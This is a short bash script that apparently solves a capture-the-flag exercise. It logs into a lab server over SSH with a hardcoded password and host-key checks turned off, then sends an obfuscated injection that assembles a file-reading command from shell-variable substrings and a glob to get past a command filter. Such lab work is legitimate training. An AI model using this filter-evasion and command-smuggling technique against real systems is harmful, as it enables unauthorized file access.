#!/bin/bash
export SSHPASS='647e170e'
SSH="sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -p 48141 ctf-player@xebec.cylabacademy.net"
printf '*\n*; ${_:3:2}${_:8:1} */????.???\nexit\n' | timeout 60 $SSH 2>&1 | tail -20
